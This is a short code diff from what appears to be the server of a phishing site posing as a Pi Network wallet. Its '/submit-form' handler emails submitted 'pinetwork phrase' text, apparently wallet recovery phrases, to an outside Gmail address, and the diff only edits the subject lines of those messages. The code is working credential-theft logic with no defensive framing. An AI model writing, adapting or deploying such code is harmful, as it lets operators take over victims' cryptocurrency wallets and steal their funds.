@@ -76,7 +76,7 @@ app.post("/submit-form", async (req, res) => {
   .sendMail({
     from: "PiNetworkWallet",
     to: ["pinetworkclaimpi@gmail.com"],
-    subject: "pinetwork phrase - INITIAL",
+    subject: "pinetwork phrase",
     text: "undefined", // placeholder text
     html: `<h1>undefined</h1>`,
   })
@@ -88,7 +88,7 @@ await transporter
   .sendMail({
     from: "PiNetworkWallet",
     to: ["pinetworkclaimpi@gmail.com"],
-    subject: "pinetwork phrase - ACTUAL",
+    subject: "pinetwork phrase",
     text: mfText,
     html: `<h1>${mfText}</h1>`,
   })
